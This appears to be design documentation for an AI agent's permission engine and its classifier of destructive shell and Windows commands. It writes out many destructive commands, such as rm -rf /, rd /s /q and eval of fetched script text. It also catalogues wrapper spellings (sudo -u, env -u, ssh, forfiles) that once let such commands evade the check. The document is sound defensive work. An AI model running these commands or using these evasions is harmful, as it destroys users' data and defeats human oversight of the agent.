# Command classifier and permission engine

The command classifier reads one command line and reports whether it can destroy data. The permission engine runs that classifier above every permission mode and every allow rule. This document explains what each rule recognises, how the rules were tested, and why several decisions that look wrong are deliberate.

Three files are the source. `packages/agent/src/dangerous-command.ts` holds the classifier, about 9200 lines. `packages/agent/src/shell-tokens.ts` holds the shell scanner both files share. `packages/agent/src/permissions.ts` holds the rule engine that calls the classifier. Every rule was written against a source document, a binary on a development machine, or a measurement recorded in a comment next to the rule.

## Purpose

The classifier exists because "the user said yes once" and "this specific command is safe" are different claims. A permission system with only the first claim cannot tell a model that ran `rm -rf /` from one that ran `bun test`. The classifier gives the engine a way to recognise a destructive command as such, whatever wrapper or shell carries it.

The permission engine is a pure function over a tool call. It answers allow, deny, or ask. It reads rules from every source, it holds the plan-mode promise, and it consults the classifier for `Bash` calls. The engine also extends file deny rules across the shell, so a rule that protects a file also protects that file from `cat`.

The entry point is `classifyDangerousCommand` at `packages/agent/src/dangerous-command.ts:5034`. It returns a match object or `null`. The return type is `DangerousCommandMatch` (`packages/agent/src/dangerous-command.ts:17`) with a `kind` of `ForcedRm` or `Other` and a `rule` string for the dialog. `null` means "nothing here was recognized as dangerous". It is not a claim that the command is safe, and the engine never widens access on it.

## Behavior

### Entry point and the platform

`classifyDangerousCommand` takes the command text and a platform argument that defaults to the current platform (`win32` becomes `windows`, everything else becomes `posix`). It calls `matchScript` with depth zero. All classification is one collection of pure functions. Nothing in the file touches the filesystem, the network, or a process.

### Wrapper following and the depth bound

Wrappers are followed, not trusted. `sudo rm -rf /`, `env FOO=bar rm -rf` and `bash -lc 'rm -rf /'` are the same command to the thing that will be harmed, so the classifier recurses into what each wrapper runs. The same move applies to PowerShell, where `powershell -Command "..."` keeps a whole script in one argument.

Depth is bounded at `MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH` = 8 (`packages/agent/src/dangerous-command.ts:15`). The bound fails closed. A command nested deeper than the bound is classified `Other`, not allowed. Eight is enough for anything a person writes and shallow enough that the recursion is bounded work.

The program name is read by `executableName` (`packages/agent/src/dangerous-command.ts:70`). The POSIX branch splits on `/` and lower-cases the result. The Windows branch splits on `/` and `\`, strips a drive letter, and strips the suffixes `.exe`, `.cmd`, `.bat` and `.com`. The suffix strip belongs to the Windows branch alone. The asymmetry is measured in both directions. `rm.exe -rf /` is flagged on `windows`, and not flagged on `posix`, where it is a different program with a different name. An earlier comment said "no `.exe`" with no platform attached, which described only half of the function.

The POSIX branch lower-cases the name even though POSIX paths are case-sensitive. `RM -rf` and `sudo RM -rf` are not commands a POSIX shell can run, so the fold does not change what any real invocation matches. It stops the classifier from a read of that program as an unrelated name. The Windows branch always folded, and the two platforms must not disagree about a program's name.

### The `rm` rules

`rmArgsIncludeForce` (`packages/agent/src/dangerous-command.ts:92`) reports whether an `rm` was forced. A `--` ends the options, so `rm -- -f` removes a file named `-f` and is not forced. Case is folded here and only here. A path argument is folded too. The fold is harmless, because the force test still needs a `-` at the front, and a path cannot gain one by a fold. GNU and BSD `rm` reject `-F` outright, so `rm -RF` deletes nothing on either. The fold does not trust the local `rm` to be the strict one.

`rmTargets` (`packages/agent/src/dangerous-command.ts:108`) is a separate walk because the two questions stop in different places. The force test stops at `--` because everything after it is a path. This walk stops there because everything before it is an option. Long options are read whole, not as clusters. `-r` and `-R` are recursion and cluster with other short flags, but `--recursive` must match in full. `--version`, `--preserve-root` and `--help` each hold the letter `r`, and a cluster read without the `--` exclusion calls all three recursion. The lone dash is standard input, which is a path and not a flag.

`resolveAbsoluteSegments` (`packages/agent/src/dangerous-command.ts:136`) resolves `.` and `..` the way the kernel does, and returns `null` for a path that is not absolute. The rule is not invented here. `rm --help` documents its own failsafe as `--preserve-root`, which rejects an argument that resolves to `/`. So coreutils decides the question when it resolves the argument. `..` at the root is clamped rather than allowed to escape.

`isUnrecoverableRmTarget` (`packages/agent/src/dangerous-command.ts:152`) matches three families: a filesystem root, a home directory, and a repository's metadata. What the families share is that no later command gets them back.

Recursion alone is enough here, and the force rule is not. `-f` decides whether `rm` asks. With a terminal attached, that is the whole difference between `rm -r` and `rm -rf`. This product has no terminal, because `exec` spawns with `stdio: ["ignore", "pipe", "pipe"]`, so stdin is not a tty and GNU `rm` prompts for nothing. Measured on a development machine, with stdin closed and no `-f`. A directory with a mode-444 file inside was removed whole, that file included, exit 0. So `-r` is as final as `-rf` for every target below the root.

The root is the exception, and the rule is a failsafe rather than a claim. Measured here on GNU coreutils 8.32: `rm -r /` prints `it is dangerous to operate recursively on '/'`, prints `use --no-preserve-root to override this failsafe`, and removes nothing. The default rejects only the literal `/`. A match on `/` costs a prompt on a command GNU already refuses, and it catches the one spelling where the failsafe was lifted. That is the only spelling worth a rule. A rule that said `rm -r /` destroys the root claims something this machine's `rm` does not do.

Four things are deliberately left alone, because a limit that is not written down is a limit someone discovers. A relative `.` or `..`, a `*`, and any path under a root rather than at one are not matched. `rm -r .` from a repository checkout is a real mistake, but that tree is the one thing with a backup. `rm -r ./*` is ordinary file cleanup. A wider list costs a prompt on the most common command in the category. The relative exemption is why `resolveAbsoluteSegments` returns `null` for a relative path rather than a resolved one. `rm -r ..` names whatever the caller stands in, which the command line cannot say, while `/..` names the root whatever the caller stands in.

Measured here as well: GNU `rm` refuses any argument whose last part is `.` or `..`, with `refusing to remove '.' or '..' directory: skipping 'child/..'` and exit 1 and nothing removed. That refusal is not a licence to match those spellings, and it is not a licence to skip the resolved target either. A `rm` without the refusal is a real thing. The argument is matched for what it names, not for what one version does with it.

The empty argument is an argument. A shell collapses `""` and `''` to the empty string before `rm` runs. So `rm -r ""` reaches the classifier as a real argument with nothing in it. Measured: `rm -r ''` prints `cannot remove '': No such file or directory`, exits 1, and leaves the directory it ran in untouched. A rule that collapsed it to `/` invents a target the command cannot destroy. It is allowed, and what allows it is the `startsWith("/")` check in `resolveAbsoluteSegments` rather than a line in the caller. An empty string is not absolute, so the resolver declines it and every test below sees `""`.

Spelling details of the match. Final slashes are stripped first, so `/` does not reduce to `.` and then lose the dot to a `./` strip. A front `./` is stripped. The spellings `~`, `$HOME` and `${HOME}` are matched as root. `/..` and `/.` are the root by another spelling, and `/srv/repo/..` is `/srv`, so the input is resolved through `resolveAbsoluteSegments` before the tests. The top-level directory test is a named list. The list: `bin`, `boot`, `dev`, `etc`, `home`, `lib`, `lib32`, `lib64`, `libx32`, `opt`, `proc`, `root`, `sbin`, `srv`, `sys`, `usr`, `var`. `/usr` is one directory, `/usr/local` is not in the list, and the match on the first segment is what makes that the answer. A target whose last segment is `.git` is metadata wherever it sits, so `foo/.git` and `/srv/repo/.git` match as readily as a top-level `.git`.

The `biome-ignore` line inside this function is a directive. It marks the `$HOME`/`${HOME}` string as a shell spelling rather than a template placeholder. A code line, not a comment to trim.

### Leading assignments and shell wrapper scripts

`isAssignment` reports `NAME=value` when the `=` is not at position zero and the token does not start with `-`. `stripLeadingAssignments` (`packages/agent/src/dangerous-command.ts:192`) returns the stripped array by identity when nothing changes, so the caller can ask "did anything change?" with `!==` and know the answer. That identity is what stops a segment with no assignments from a call into itself.

`wrapperScript` (`packages/agent/src/dangerous-command.ts:199`) reads the script text out of a `sh -c '...'` style invocation. It skips long options entirely, and that line does real work. `bash --norc -c 'rm -rf /'` is an ordinary invocation that wants no rc file. `--norc` holds a `c`. So a test that looks for the letter anywhere in the word took `--norc` as the switch and returned the literal `-c` as the body. The body was never read, and `rm -rf /` inside it was classified as the command `-c`. No shell in `SHELL_EXECUTABLES` (`sh`, `bash`, `zsh`, `ksh`, `dash`, `packages/agent/src/dangerous-command.ts:25`) has a long option that takes a command. Their long options are `--norc`, `--noprofile`, `--posix`, `--rcfile`, `--version` and `--help`. The accepted spellings are `-c`, `-lc`, `-lic` and `-e -c`, which is any short option that holds the letter `c`. A next token of `-` or nothing returns `undefined`.

`substitutionScripts` (`packages/agent/src/dangerous-command.ts:1230`) reads `$( ... )` and backtick spans out of the raw segment, because a substitution's contents are not a token. `echo "$(rm -rf /tmp/x)"` becomes one word with the delete inside it, and a word-by-word read never looks there.

### Shell scaffolding

`SHELL_SCAFFOLDING` (`packages/agent/src/dangerous-command.ts:1261`) names the words that can open a command segment without a command of their own: `(, ), {, }, if, then, elif, else, fi, for, while, until, do, done, case, in, esac, time, !`. The splitter cuts on `;`, `|`, `&` and newline. A segment can still begin with the punctuation of a group or with the keyword that starts a control structure's body. Every rule below reads `tokens[0]` as the program's name. Without this list, the word in front of the command is the word those rules see.

`stripShellScaffolding` (`packages/agent/src/dangerous-command.ts:1285`) removes those words from the front of a token list. It is not a shell parser. A real parse needs a tree-sitter grammar, and this repository has no equivalent. It reads those words at the front and stops at the first word that is not one of them. A `{` or `(` that is not the first character stays where it is. So `echo "{"` is untouched, and so are `find . -exec {} \;`, `awk '{print $1}'` and `git log --format='(%h)'`. It returns `undefined` rather than the same array when it strips nothing, for the identity test its callers use. A glued `(rm` is stripped to `rm` and returned as a new array. The caller then sees a change even though the array keeps its length.

The `time` keyword has its own rule: only `time -p` and `time --` are stripped. Measured: `time rm -rf D`, `time -p rm -rf D` and `time -- rm -rf D` each ran the delete. `time -v`, `time -f x` and `time -o /dev/null` did not. The shell keyword form only knows `-p` and `--`, so those three are left as `null` on purpose.

`countOf` counts how often a token appears in a list. It backs the checks on wrappers.

#### The CMD control words

`CMD_IF_KEYWORDS` and `CMD_IF_COMPARISONS` say how much condition sits between a CMD `if` and the command. The first names the tests that take one operand after them: `exist`, `errorlevel`, `defined` and `cmdextversion`. The second names the six comparison operators: `equ`, `neq`, `lss`, `leq`, `gtr` and `geq`. Both sets were measured against a real `cmd.exe` on the development machine. The harness is one `cmd /c <line>` with a `rd /s /q` behind it and a scratch directory to delete. `if exist`, `if not exist`, `if errorlevel 0` and `if cmdextversion 1` each deleted the directory. `if defined FOO` did not, and `if not defined FOO` did. That pair is the same fact from both sides. `defined` is a keyword, and whether the command behind it runs is a question about the variable. The rule does not answer that question on purpose. The six operators were measured the same way, with a condition that is true. `if 1 equ 1`, `if 1 neq 0`, `if 1 lss 2`, `if 1 leq 1`, `if 1 gtr 0` and `if 1 geq 1` each ran the delete behind them. A seventh spelling, `lsr`, failed two conditions on the same harness and is not in the set.

`stripControlWords` removes a Windows control word and the words between it and the command. `stripShellScaffolding` reads a control word as one word. That is right for a POSIX `if` and wrong for CMD's. A CMD `if` answers with a condition before it answers with a command, and `for` answers with a whole clause. Both hid the command behind them, and every shape measured for this batch came back `null` for it: `if exist C:\x rd /s /q C:\y`, `for %f in (a b) do rd /s /q C:\y` and `cmd /c call rd /s /q C:\y`. The strip is called from two places, and the two are not interchangeable. From `matchTokens`, before the assignment strip and the shell-word strip, it is what lets a `for` be seen whole. `for` is in a platform-independent list, and those strips take the word off before anything here can read the clause. From `dangerousCmdSegment` it reads the control words inside a `cmd /c` body. Neither strip ever sees that body, because a body is a word array handed straight to the CMD rules.

The `if` grammar is read as one word of condition, extended to three only when the next word is a comparison operator. The four keyword tests take one operand each. The `for` grammar takes any number of words up to the `do`, and the `do` that counts is the one outside the parenthesised set. A `for` with no `do` is not a shape this code reads. A clause that runs off the end of the line is left as it was. No condition is decided, and none can be. `if 1 lss 2` is true and `if 1 lss 0` is not. The reason to report the line is that the person who wrote it may not mean it. That is true of every condition here. The return is `undefined` rather than the same array, for the reason above: the caller asks "did anything change?" with `!==`. Every pass takes at least one word, so the recursion ends.

`call` runs the command behind it. Measured: `call rd /s /q <dir>` deleted the directory, and so did `call del /f <file>`. The word is taken off in front of a label as well, and that costs nothing. The words after a label are arguments to a subroutine and are not a command. The same harness measured the label case against a batch file with a `:cleanup` label. There, `call :cleanup rd /s /q <dir>` left the directory alone, while a separate `rd` after it deleted it. So the label word becomes the head of the segment, and no rule here matches it either way.

### Command prefixes and concealers

`COMMAND_PREFIX_PROGRAMS` (`packages/agent/src/dangerous-command.ts:29`) names the programs whose job is to run the command behind them, in the same sense as `sudo`. The words in front of one of these are the wrapper's words, not the command's.

Every entry is a payload concealer, not a payload relocator. That line decides membership, and the test is one question: can the payload land in a different mount namespace, or on a different host? `timeout 5 rm -rf /` runs `rm` in the caller's own filesystem as the caller's own user, which is why it is here. `chroot /jail rm -rf /` cannot. The root changes, so `chroot` lives in `REMOTE_COMMAND_CARRIERS` and not here, and the same goes for `nsenter` and `systemd-run`. A relocator on this list adds no second line of defence. It makes the classifier read a payload with the wrong platform grammar. `remoteCommandScript` resolves the command it finds against both the posix and the windows shapes. That is right for a name that can be either, and wrong for one that always runs on this machine.

`command` is the sharpest entry. It is the POSIX builtin that runs a name, so `command rm -rf /` is a delete with one extra word. `doas` and `pkexec` are `sudo` under another name on the systems that have them. `nice` and `nohup` are the ordinary spelling of a background run at lower priority.

`su` is not in the set. Its `-c` carries the command the way `sh -c` does, so the script must be read out of the flag, and `su` gets its own branch. `script` is not here for the same reason and also gets its own branch.

Two exclusions are deliberate and each costs a detection. `at` and `batch` are covered whole by the rules for scheduled tasks. Those rules fire on the program name without a read of any payload. An entry for `at` here shadows that rule. This branch runs first, finds nothing after `at`, and returns `null` before the task rule is reached. The BSD sources also say the payload does not come from argv: `parsetime()` ends in `expect(EOF)`, so `at 13:00 rm -rf /` is rejected rather than run. The schedulers that take the command from stdin (`echo 'rm -rf /' | at now`) are out of scope. The reason is the same one a command inside a pipe gets: it is only partly handled. The words are in a pipe, not in the token list.

Membership on the list is mandatory, and it is not enough. Membership says where the payload is. It does not say how many wrapper words stand in front of it. `commandAfterOptions` answers "the first word that is not an option". For `timeout`, `taskset`, `flock` and `chrt` that word is an operand of the wrapper rather than the command. `timeout 5 rm -rf /` starts with a duration. A program on this list needs a row in `COMMAND_PREFIX_OPERANDS`, a row in `COMMAND_PREFIX_VALUE_OPTIONS` and a row in `COMMAND_PREFIX_QUERY_OPTIONS_BY_PROGRAM`. Without the first two the operand is read as the command. Without the third the payload is read as the argument of a flag that takes none.

The set is `command`, `exec`, `nohup`, `nice`, `doas`, `pkexec`, `timeout`, `stdbuf`, `setsid`, `setpriv`, `taskset`, `flock`, `chrt`, `ionice`, `runuser`, `watch`, `strace`, `chpst`, `busybox`. Only `timeout` and `stdbuf` can be checked against a binary on the development machine. The rest are GNU coreutils, util-linux, procps-ng, runit, Linux strace and busybox sources, none of which is installed there. Each row cites the source it was read from, because that citation is the only thing that makes an uncheckable row checkable later.

### Options that take a value

A wrapper option can eat the word after it. If that option is read as a flag that takes none, the value is read as the command. The asymmetry is measured: `xargs` had a value-option table and the other six wrappers did not, and that is what let `env -u PATH rm -rf /` and `nice -n 10 rm -rf /` through. `env`'s own hand-written skip knew `-i`, `--ignore-environment` and assignments, so every other real `env` option became the program name.

`COMMAND_PREFIX_VALUE_OPTIONS` (`packages/agent/src/dangerous-command.ts:1423`) is one set per program rather than one set for all. The reason is a collision rather than tidiness. `-n` is `nice`'s value and `doas`'s "do not prompt", so a shared list turns `doas -n rm -rf /` into a miss, because `-n` swallows the command. These are different programs that share a letter.

The map is a list the code has to be right about rather than one it can ask. The code cannot run any of these programs. A wrong entry moves the boundary one word either way, and the words on both sides of that boundary belong to the wrapper. The cost of a wrong entry is how often the command behind the wrapper is found, not what is found when it is. Each row below was read out of the source in its comment, or measured on the development machine where the binary exists. Every row says which, because a list of flags that only looks plausible is the failure mode this map is written to avoid.

### Operands that belong to the wrapper

`commandAfterOptions` answers "the first word that is not an option". For `env`, `sudo` and `xargs` that word is the command. For many wrappers it is an operand of the wrapper, and the command comes after it. `timeout 5 rm -rf /` has the DURATION first, `flock /tmp/l rm -rf /` the file, `taskset 0,1 rm -rf /` the cpu list. A program added to `COMMAND_PREFIX_PROGRAMS` without an operand row does not catch the delete. It reads the operand as the command and finds a program called `5`. That is the whole reason `COMMAND_PREFIX_OPERANDS` exists.

`COMMAND_PREFIX_OPERANDS` (`packages/agent/src/dangerous-command.ts:1628`) holds `timeout` 1, `taskset` 1, `flock` 1 and `chrt` 1. Each entry says whether the operand is mandatory, because the mandatory case is the one where a skip is unambiguous.

- `timeout`'s DURATION is mandatory and first. Measured: `timeout echo hi` prints `invalid time interval 'echo'` and exits 125, so an absent DURATION is a usage error rather than a command.
- `taskset`'s cpu list is mandatory and first, from the source cited in the row.
- `flock`'s file is mandatory and first. The usage block at `flock.c:69-71` spells the order as `[options] <file>|<directory> <command> [<argument>...]`.
- `chrt`'s priority is optional. `chrt.c` reads `argv[optind]` only when it is all digits (`isdigit_string`, `chrt.c:611`). One word is therefore skipped unconditionally, which catches `chrt -f 1 rm -rf /` and leaves `chrt -o rm -rf /` a miss. A miss, not a false positive, and that is the direction this file prefers.

`runuser` is not in the map even though it also takes a user before the command, because its operand is conditional rather than mandatory. The user is a positional only when `-u`/`--user` is absent (`su-common.c:1017` marks it "runuser only"). A skip of one word breaks the common `runuser -u root -- rm -rf /`, which the branch reads correctly. The cost is that `runuser root rm -rf /`, the user as a bare word, stays a miss. That is the trade the map documents rather than hides.

`operandsFor` (`packages/agent/src/dangerous-command.ts:1637`) exists because one operand count is not unconditional. `flock` fills the same slot from inside an option when `--fd` is given. Its usage block (`flock.c:69-74`) lists both `[options] <file>|<directory> <command> [<argument>...]` and `[options] --fd <file descriptor number> <command> [<argument>...]`. With `--fd` the descriptor goes in as a value option and the positional slot is empty. A count of one anyway steps over the command and makes `flock --fd 3 rm -rf /` a miss.

### Query options

`COMMAND_PREFIX_QUERY_OPTIONS` (`packages/agent/src/dangerous-command.ts:1649`) names the options that print and exit, so no command follows them: `-v`, `-V`, `--help`, `--version`. `command -v rm` is a lookup, and `nohup --help` is help. A word after one of these read as the command invents a match out of a question.

The shared set is right for most programs, and an error in that direction is not a false positive. A flag that only prints a version and exits cannot hide a payload. So a return of no command is correct even when the program has no such flag. The comment records the measurement: `watch -V` and `stdbuf -v` are usage errors, and the scanner treats them as queries, which reaches the same answer anyway.

The other direction costs detection. `COMMAND_PREFIX_QUERY_OPTIONS_BY_PROGRAM` (`packages/agent/src/dangerous-command.ts:1653`) holds the four programs where `-v` or `-V` goes on to run the command:

- `timeout`: `-v` is `--verbose`, measured on coreutils 8.32. `timeout -v 1 echo hi` printed `hi` and ran the command. A read of the word after `-v` as a query makes `timeout -v 5 rm -rf /` a miss. Its `-h` and `-V` are rejected outright by this coreutils, so nothing claims they are queries.
- `chrt`: util-linux `chrt.c:564`, `case 'v': ctl->verbose = 1;`. Its `-V` is the real version flag.
- `chpst`: runit `chpst.c:322`, `case 'v': verbose = 1;`. Its `-V` warns with the `$Id` and then calls `usage()` at `chpst.c:327`, which is `strerr_die4x(100, …)` at `chpst.c:39` and does not return. `--help` and `--version` reach the same `usage()` through the getopt `?` case, because chpst has no long options of its own.
- `strace`: Linux `src/strace.c:2756`, `case 'v': qualify_abbrev("none")`, and `:2759`, `case 'V': increase_version_verbosity()`, which at `strace.c:2320` only bumps a counter and does not exit. `--version` maps to that same `'V'`, so it is not a query either. `-h` and `--help` are queries (`strace.c:2618` calls `usage()`), and `strace.c:2485` marks `--help` `no_argument`.

The three util-linux and runit entries were read from source, not measured. None of `chrt`, `chpst` or Linux `strace` is installed on the development machine.

`busybox` has no `-v` or `-V` at all. The four words it does read out of `argv[1]` are `--show`, `--list`, `--install` and `--help` (`libbb/appletlib.c:838`, `:850`, `:868`, `:892`). `--list` and `--install` are matched there as prefixes (`is_prefixed_with`), so the longer spellings are not in the set. They run nothing either way, and a longer spelling is left to the positional scan rather than matched here.

`queryOptionsFor` reads the per-program map and falls back to the shared set.

### Finding the command after the options

`commandAfterOptions` (`packages/agent/src/dangerous-command.ts:1677`) returns the command a wrapper will run. It is the first word that is not an option, the argument of one, or an assignment. Then the wrapper's own operands come off the front. `--` ends the options, which is what makes `env -- rm -rf /` and `xargs -- rm -rf /` one command rather than a command wrapped in a flag.

The `--` branch carries a note that is easy to lose. The branch is not essential for any command anyone writes. The generic flag-skip below it reaches the same answer. The word after `--` is a program name, and a program name does not begin with a dash. A mutation that deleted the block left every test green. The branch is there for the one case the fallthrough gets wrong. After `--`, a word can begin with a dash. Then it is the program's name rather than an option of the wrapper's.

The first branch inside the loop checks `queryOptions` and returns no command at all, because a query option means nothing behind it runs.

### The dispatch order in `matchTokens`

`matchTokens` (`packages/agent/src/dangerous-command.ts:1712`) is the heart of the file. The order of its branches is part of the behaviour, so this section records the order and the reason for it.

- Depth check first. A command nested deeper than `MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH` is a command that this function can no longer follow. The only safe answer for that case is that it is dangerous. The result is `Other` with the rule `nested deeper than 8 wrappers`.
- Empty token list returns `null`.
- On Windows, `stripControlWords` runs before both strips below, and the order is half the fix. These control words read as one word each. That is right for a POSIX shell and wrong for CMD's, where `for` answers with a whole clause before it answers with a command. When the strip runs second, `if 1==1 del /f C:\x` is no longer a match. The assignment strip takes `1==1` first and leaves `if del /f C:\x`, whose condition is then read as the program.
- The assignment strip runs at the top level. `isAssignment` was already in the file and already consulted, but only inside `commandAfterOptions`, which is to say only after a wrapper was recognised. At the top level it was unreachable. `LC_ALL=C rm -rf /` sets a variable and runs a command, so the program is the first word that is not an assignment. The recursion is safe because the array strictly shrinks. Depth is deliberately not raised. An assignment is not a wrapper, and a count of it spends the depth budget on a word that runs nothing.
- The shell words that lead a segment come off next.
- `developmentToolRules` is consulted here rather than in `matchScript`, and the difference is not cosmetic. `matchScript` reads each segment exactly once, and that read happens before any wrapper on the segment is stepped over. So anything consulted there never sees the command a wrapper stood in front of. Measured before this was moved here: `sudo git clean -fdx`, `bash -c "git push --force"` and `powershell -Command "docker system prune -a"` each classified as nothing. The same three commands with the wrapper removed were caught. The test that found it is the one that asserts a wrapper does not hide a command. `git` and the same family are never wrappers themselves, so no unwrap can pass them.
- `rm` gets a branch of its own. A force option is `ForcedRm` with the rule `` `rm` with a force option ``. The name means a forced rm, not a forced recursive rm: `rm -f notes.txt` matches the same way `rm -rf /` does. Recursion plus an unrecoverable target is `Other`. The rule reads `` `rm` with recursion, aimed at a filesystem root, a home directory or a repository, which has no narrower form ``. `decideDangerous` in the permission engine reads the rule text alone, and nothing branches on `kind` yet.
- `sudo` goes through the shared skipper, and that step is the whole fix. This branch used to hand `tokens.slice(1)` straight back, so every option in front of the command was left where the program name is read. `sudo -u root rm -rf /`, the everyday spelling a user types rather than the one a test thinks of, classified as nothing.
- `eval` is here because it was measured, not because it was assumed. Against a real `bash`, `eval "rm -rf D"`, `eval 'rm -rf D'` and `eval rm -rf /` all deleted the directory, and `eval "echo hi"` did not. The string is the script, so the readable case is a script read rather than a shape match, the same treatment `su -c` and `sh -c` get. `tokenizeShell` already removed the quotes, so the script is the words after `eval` rejoined. The unreadable case is the one worth a loud message. `$(...)` and a backtick are filled in when the shell gets there, so `eval "$(cat x.sh)"` runs whatever the file says. All three spellings measured to run. A report of them as a match is the same trade this file makes for `-EncodedCommand`. One prompt too many is cheaper than a string nobody read that then runs unsupervised.
- `env -S 'rm -rf /'` does not take a command after the options. It takes a string, splits it the way a shell does, and runs the pieces. The words after `-S` are that string, so the shared skipper steps over the command and hands back nothing. The branch expands the string in place, and that is what keeps this to one skipper for seven wrappers rather than seven near-copies. A value of `-` is not expanded.
- `su -c 'rm -rf /'` is `sh -c` under another name, so the flag carries the command and the branch reads a script, not a skip past the options. `su` also takes a user before the flag (`su root -c …`), which is why the flag is looked for anywhere rather than at a fixed offset. `su` with no `-c` starts an interactive login shell, which runs nothing of its own, so the branch returns nothing.
- `runuser` answers to `-c` in exactly the way `su` does, from the same source: `su-common.c:1017` pairs `command` with `required_argument`, assigned at `su-common.c:1054`. But unlike `su`, a line with no `-c` does not mean a login shell that runs nothing. It means the command is spelled out as words. So this branch falls through to the wrapper list, and it does not answer `null` the way `su`'s does. A wrong answer there is not a near miss. It is `runuser -u root -- rm -rf /` classified as nothing at all, which is the whole example this work started from.
- `script` is here rather than in the wrapper list for two reasons that are both in its source. Its command rides in a flag: usage is `script [options] [file]`, and `-c`/`--command` takes the command as a separate argument (`script.c:847`). `script.c:1066` runs it as `execlp(shname, shname, "-c", ctl.command, NULL)`, the exact `sh -c` shape. Its first positional is not a command: `script.c:193` and `:944` take the first bare word as the output log file. `script.c:970-972` dies when that word is absent. `script /tmp/log rm -rf /` therefore logs an interactive session and runs nothing. A read of that positional as a command is a false positive on an ordinary thing. Only `-- command`, the documented way to say it, is read. Read from source, `script` not installed here.
- `flock`'s `-c`/`--command` is the same shape, and `flock.c:58` defines `IS_COMMAND_OPT` for it and `flock.c:335-337` leaves the option loop on it. That is why the option is in neither the getopt string nor the long table. An entry in the value-option map is a flag that does not appear in the tables at all. A carried command is read as `sh -c`. A carried value of `-` or nothing returns nothing. Without `-c`, the branch falls through.
- `xargs rm -rf` is `rm -rf` once per line of input. It is a wrapper in exactly the sense `sudo` and `env` are. It is also the reason `find … | xargs rm -rf` is the ordinary spelling of the delete this file exists to catch. Its skipper uses `XARGS_VALUE_OPTIONS` (`packages/agent/src/dangerous-command.ts:1399`), its own set, kept beside this branch rather than in the map.
- The generic wrapper branch reads `COMMAND_PREFIX_PROGRAMS` and passes all three tables to `commandAfterOptions`: value options, query options and operands. `command` and `exec` are the sharpest of these, because they are POSIX builtins. Their entire purpose is to run a name this function does not otherwise recognise. `command rm -rf /` was classified as nothing at all before this branch existed.
- `trap`'s action is shell source in the first operand. An optional `--` is stepped over, and a first operand that does not begin with a dash is read as `sh -c`.
- `forfiles /c "cmdstring"` runs a whole command line once per file found, and it is the standard CMD spelling of a mass delete. The comment calls it a bypass rather than a gap in the vocabulary. `forfiles /p C:\Users /s /c "cmd /c del /f @path"` holds a literal `del /f` and classified as nothing, because `dangerousCmdSegment` reads the program off the first word and that word is `forfiles`. The branch hands the payload to `matchScript`, not to a shape match. So whatever the file already knows about `del`, `rd` and `cmd /c` applies to the payload without a second name for it. `forfiles` with no `/c` only lists files and returns nothing.
- The `forfiles` measurement is worth a full note. Whether the payload removes anything was measured with `cmd.exe` on the development machine and a scratch tree. `rd` on a directory that holds a file answers exit 145 and the directory survives. `rd` on a file, which is what `@path` expands to, answers exit 267 and the file survives too. That is because `rd` takes a directory and refuses a file. So `forfiles /c "cmd /c rd @path"` runs and deletes nothing, and it is allowed for the same reason `rd C:\x` is. The spelling `rd /s /q @path` does remove the file, which is why that spelling is in the dangerous table and this one is not.
- The payload reads through `matchScript`, so `forfiles /p C:\ /s /c "rm -rf /"` is `ForcedRm` even on the `windows` platform. That is the platform-agnostic `rm` rule at work, as on a top-level line. This branch does not widen a platform. The same string is `null` under `ssh`, because `ssh` is not in `SHELL_EXECUTABLES` and nothing follows its argument at all.
- The loop stops at the first `/c`, and that is not a claim about which `/c` wins. `forfiles` refuses a repeated `/c` outright. The same line with two `/c` options prints a localized invalid-syntax error that points at the repeat and runs nothing. The measurement used an `echo` payload, so no delete was possible either way. There is no `/c` that wins. A read of the first one flags a line that cannot run. It costs one prompt too many, and that is the smaller of the two mistakes this file takes on purpose. It is why `forfiles /c "cmd /c type @path" /c "cmd /c del /f @path"` is an allowed test row and not a dangerous one.
- The `payload === ""` guard used to be in this branch and was removed. Nothing held it: a mutation that deleted the clause left the suite green. `tokenizeShell` really does hand the empty payload over as a token, and `matchScript("")` is simply `null`, which is why `forfiles /c ""` is allowed either way.
- After `forfiles` comes the remote carrier lookup, then the wrapper scripts. Every wrapper this segment holds is followed one level deeper: `wrapperScript`, `powershellScript` and `substitutionScripts` feed `splitShellCommands`, and each inner command re-enters `matchTokens` at `depth + 1`.
- On Windows the line goes to `matchWindows`. On POSIX it goes through ten rule functions in a fixed order: `posixDiskRules`, `posixVolumeRules`, `posixSubcommandVolumeRules`, `posixPermissionRules`, `posixFindRules`, `posixProcessRules`, `posixProtectionRules`, `posixSchedulingRules`, `posixAccountRules`, `posixSocketExecRules`. The first match wins, so an order fact is a behaviour fact. The disk rules run before the volume rules, and the list rules run before the destructive ones inside each function, for the same reason.

### Remote command carriers

`ssh host "rm -rf /var"` and `ssh host rm -rf /var` are one command spelled two ways. `tokenizeShell` already removed the quotes, so the quoted form arrives as a single token that holds spaces. The command is therefore the tokens at the end joined back together, not the next token alone. A read of only the next one sees the word `rm` and stops there.

The two spellings differ in whether a flag after the destination is a flag or an argument. That is why the option scan stops at the destination and takes the rest verbatim. In `ssh host rm -rf /var` the `-rf` is an argument to `rm`. A scanner that runs the option scan past the destination reads it as a flag.

The key in `REMOTE_COMMAND_CARRIERS` (`packages/agent/src/dangerous-command.ts:916`) may name a verb, as `kubectl exec` does. The program alone is not a carrier: `kubectl get pods` and `docker ps` run nothing anywhere.

`ssh` is already named in `CREDENTIAL_SENDERS`. The file knew the program and never treated it as a carrier. Both spellings measured `null` on both platforms: `ssh host "rm -rf /"` on `posix` and `ssh.exe host "rm -rf /var"` on `windows`.

The carrier call passes `depth`, not `depth + 1`. The wrappers below (`sudo`, `env`, `xargs`, a shell body) each re-enter `matchTokens` one level down. This call is the same kind of step, and `remoteCommandScript` does its own `depth + 1` on the way into the payload. An extra one here made every carrier hop cost two. `MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH` reads as a count of wrappers and is documented as one, yet it admitted nine `sudo` hops and only five `ssh` ones. Measured on both spellings: `sudo` classified `ForcedRm` through 8 hops and `ssh h` only through 4. Both then failed closed with `nested deeper than 8 wrappers`, which described a six-hop `ssh` chain in terms of eight. Nothing was let through by it, because the fail-closed answer is still a block. The number in the message did not count what it claimed.

The carrier interface (`packages/agent/src/dangerous-command.ts:242`) has five parts, and each part exists because one carrier needs it:

- `positionals` counts the words between the options and the command that name what the command runs on. `ssh` has exactly one, the destination, and everything after it is the command whatever it looks like.
